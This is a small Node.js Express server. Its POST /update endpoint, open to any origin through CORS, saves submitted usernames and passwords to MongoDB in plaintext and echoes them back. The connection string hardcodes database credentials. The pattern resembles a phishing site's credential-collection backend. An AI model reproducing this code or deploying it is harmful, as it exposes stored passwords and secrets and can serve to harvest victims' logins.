const express = require('express')
const cors = require('cors')
const mongoose = require("mongoose")
const app = express()

app.use(cors())
app.use(express.json());

require('dotenv').config()

// models/Email.js

const newSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
    },
    password: {
        type: String,
        required: true,
    },
});

const theModel = mongoose.model("new", newSchema)


app.post('/update', async(req, res) => {
    const {
        username,
        password
    } = req.body

    await theModel
        .create({
            username,
            password: password,
        })



    res.json({
        username: username,
        password: password
    })
})

const port = 3000 || process.env.PORT

mongoose
    .connect('mongodb+srv://davismeru911:Davis254@cluster0.swisynd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
    .then(() => {
        app.listen(port, () => {
            console.log("server running");
        });
    })
    .catch((error) => console.error("MongoDB connection error:", error));